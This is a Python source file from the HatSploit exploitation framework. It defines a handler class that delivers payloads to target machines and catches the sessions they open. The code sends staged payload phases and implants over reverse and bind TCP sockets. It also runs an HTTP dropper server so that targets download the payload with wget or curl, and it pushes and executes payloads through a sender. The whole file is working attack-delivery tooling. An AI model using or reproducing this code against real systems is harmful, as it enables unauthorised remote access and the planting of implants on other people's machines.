"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import time
import socket

from typing import (
    Optional,
    Tuple,
    Union
)

from hatsploit.lib.complex import *
from hatsploit.lib.core.session import Session

from hatsploit.lib.ui.payloads import Payloads
from hatsploit.lib.ui.jobs import Jobs

from hatsploit.lib.handle import Handle

from hatsploit.lib.core.payload.const import (
    REVERSE_TCP,
    BIND_TCP,
    ONE_SIDE
)


class Send(Handle, Jobs):
    """ Subclass of hatsploit.lib.handler module.

    This subclass of hatsploit.lib.handler module is intended for
    providing tools for sending payloads.
    """

    payloads = Payloads()

    types = [
        ONE_SIDE,
        REVERSE_TCP,
        BIND_TCP
    ]

    def handle_session(self, host: str, port: int,
                       payload: PayloadOption,
                       type: str = ONE_SIDE,
                       phased: bool = False,
                       timeout: Optional[int] = None,
                       session: Optional[Session] = None) -> Tuple[Union[Session, socket.socket], str]:
        """ Handle session.

        :param str host: host
        :param int port: port
        :param PayloadOption payload: payload choice
        :param str type: type of payload
        :param Optional[int] timeout: timeout
        :param Optional[Session] session: session
        :param bool phased: send phases or continue
        :return Tuple[Union[Session, socket.socket], str]: session and host
        :raises RuntimeWarning: with trailing warning message
        :raises RuntimeError: with trailing error message
        """

        if not payload.payload:
            raise RuntimeError("No payload configured for handler!")

        type = payload.info['Type']

        if type not in self.types:
            raise RuntimeError(f"Invalid payload type: {type}!")

        if type == REVERSE_TCP:
            if not host or not port:
                raise RuntimeError("Reverse TCP requires host and port set!")

            client, host = self.listen_session(host, port, session, timeout)

            if not client and not host:
                raise RuntimeError("Reverse TCP received corrupted session!")

            if payload.payload.phased.value or phased:
                self.send_all(payload, client)

            return client, host

        elif type == BIND_TCP:
            if not host or not port:
                raise RuntimeError("Bind TCP requires host and port set!")

            client = self.connect_session(host, port, session, timeout)

            if not client:
                raise RuntimeError("Bind TCP received corrupted session!")

            if payload.payload.phased.value or phased:
                self.send_all(payload, client)

            return client, host

        else:
            raise RuntimeWarning("Payload sent, but not session was opened.")

    def send_all(self, payload: PayloadOption, client: socket.socket) -> None:
        """ Send implant available in the payload with available phases.

        :param PayloadOption payload: payload option
        :param socket.socket client: primary socket pipe
        :return None: None
        """

        step = 1

        while True:
            if not hasattr(payload.payload, f'phase{step}'):
                break

            phase = payload.run(method=f'phase{step}')

            if not phase:
                raise RuntimeError(f"Payload phase #{str(step)} generated incorrectly!")

            self.print_process(
                f"Sending payload phase #{str(step)} ({str(len(phase))} bytes)...")
            client.send(phase)

            time.sleep(.5)
            step += 1

        if hasattr(payload, 'implant'):
            implant = payload.run(method='implant')

            if not implant:
                raise RuntimeError("Payload implant generated incorrectly!")

            if implant:
                time.sleep(.5)

                self.print_process(
                    f"Sending payload ({str(len(implant))} bytes)...")
                client.send(implant)

    def serve_dropper(self, dropper: DropperOption, payload: bytes) -> int:
        """ Serve dropper.

        :param DropperOption dropper: dropper to use
        :param bytes payload: payload to serve
        :return int: job ID assigned to dropper
        """

        def get_submethod(request):
            if request.path == dropper.urlpath.value:
                self.print_process(f"Delivering payload over HTTP...")

                request.send_status(200)
                request.wfile.write(payload)

        job_id = self.create_job(
            'Dropper HTTP server',
            'Handler',
            self.listen_server,
            (
                dropper.srvhost.value,
                dropper.srvport.value,
                {
                    'get': get_submethod
                },
                1
            )
        )

        self.print_process(f"Starting HTTP server (job {str(job_id)})...")
        return job_id

    def drop_payload(self, payload: PayloadOption, dropper: DropperOption,
                     host: str, port: int,
                     **kwargs) -> Tuple[Union[socket.socket, str], str]:
        """ Send payload.

        :param PayloadOption payload: payload
        :param DropperOption dropper: dropper to use
        :param str host: host to start listener on
        :param int port: port to start listener on
        :return Tuple[Union[socket.socket, str], str]: final socket and host
        """

        sender = kwargs.get('sender', None)

        if not payload.payload:
            raise RuntimeError("Payload was not found!")

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        if not host and not port:
            raise RuntimeError("Host and port were not found for payload!")

        space = payload.config.get('Space', 2048)
        arguments = payload.info.get('Arguments', '')
        platform = payload.info['Platform']
        arch = payload.info['Arch']
        type = payload.info['Type']

        buffer = payload.run()
        phased = len(buffer) > space or payload.payload.phased.value

        if phased:
            phase = payload.run(phase=True)

            if not phase:
                raise RuntimeError("No phase available for this payload!")

            phase = self.payloads.pack_payload(
                payload=phase,
                platform=platform,
                arch=arch
            )

            if dropper.value in ['wget', 'curl']:
                self.serve_dropper(dropper, phase)

            type = type if type in [REVERSE_TCP, BIND_TCP] else REVERSE_TCP
            job_id = self.create_job(
                'TCP handler',
                'Handler',
                self.handle_session,
                (
                    host,
                    port,
                    payload,
                    type
                ),
                {
                    'phased': phased
                },
                timeout=1
            )

            if dropper.value not in ['wget', 'curl']:
                self.print_process(
                    f"Sending payload phase ({str(len(phase))} bytes)...")

                config = {
                    'data': phase,
                    'args': arguments
                }
                config.update(kwargs)

                post = dropper.method.handler(sender, config)
                post.push()
                post.exec()
            else:
                dropper_id = self.serve_dropper(dropper, phase)

                config = {
                    'uri': (
                        f'http://{dropper.srvhost.value}:'
                        f'{str(dropper.srvport.value)}'
                        f'{dropper.urlpath.value}'
                    ),
                    'args': arguments
                }
                config.update(kwargs)

                post = dropper.method.handler(sender, config)
                post.push()
                post.exec()

                self.get_job(dropper_id).join()

            return self.get_job(job_id).join()

        buffer = self.payloads.pack_payload(
            payload=buffer,
            platform=platform,
            arch=arch
        )

        job_id = self.create_job(
            'TCP handler',
            'Handler',
            self.handle_session,
            (
                host,
                port,
                payload,
                type
            ),
            timeout=1
        )

        if dropper.value not in ['wget', 'curl']:
            self.print_process(
                f"Sending payload ({str(len(buffer))} bytes)...")

            config = {
                'data': buffer,
                'args': arguments
            }
            config.update(kwargs)

            post = dropper.method.handler(sender, config)
            post.push()
            post.exec()
        else:
            dropper_id = self.serve_dropper(dropper, buffer)

            config = {
                'uri': (
                    f'http://{dropper.srvhost.value}:'
                    f'{str(dropper.srvport.value)}'
                    f'{dropper.urlpath.value}'
                ),
                'args': arguments
            }
            config.update(kwargs)

            post = dropper.method.handler(sender, config)
            post.push()
            post.exec()

            self.get_job(dropper_id).join()

        return self.get_job(job_id).join()

    def inline_payload(self, payload: PayloadOption, host: str, port: int,
                       **kwargs) -> Tuple[Union[socket.socket, str], str]:
        """ Send payload if inline.

        :param PayloadOption payload: payload option
        :param str host: host to start listener on
        :param int port: port to start listener on
        :return Tuple[Union[socket.socket, str], str]: final socket and host
        """

        sender = kwargs.get('sender', None)

        if not payload.payload:
            raise RuntimeError("Payload was not found!")

        if not sender:
            raise RuntimeError("Payload sender is not specified!")

        if not host and not port:
            raise RuntimeError("Host and port were not found for payload!")

        type = payload.info['Type']
        space = payload.config.get('Space', 2048)

        buffer = payload.run()
        phased = len(buffer) > space or payload.payload.phased.value

        if phased:
            phase = payload.run(phase=True)

            if not phase:
                raise RuntimeError("No phase available for this payload!")

            type = type if type in [REVERSE_TCP, BIND_TCP] else REVERSE_TCP
            job_id = self.create_job(
                'TCP handler',
                'Handler',
                self.handle_session,
                (
                    host,
                    port,
                    payload,
                    type
                ),
                {
                    'phased': True
                },
                timeout=1
            )

            self.print_process(
                f"Sending payload phase ({str(len(phase))} bytes)...")
            sender(phase)

            return self.get_job(job_id).join()

        job_id = self.create_job(
            'TCP handler',
            'Handler',
            self.handle_session,
            (
                host,
                port,
                payload,
                type
            ),
            timeout=1
        )

        self.print_process(
            f"Sending payload ({str(len(buffer))} bytes)...")
        sender(buffer)

        return self.get_job(job_id).join()
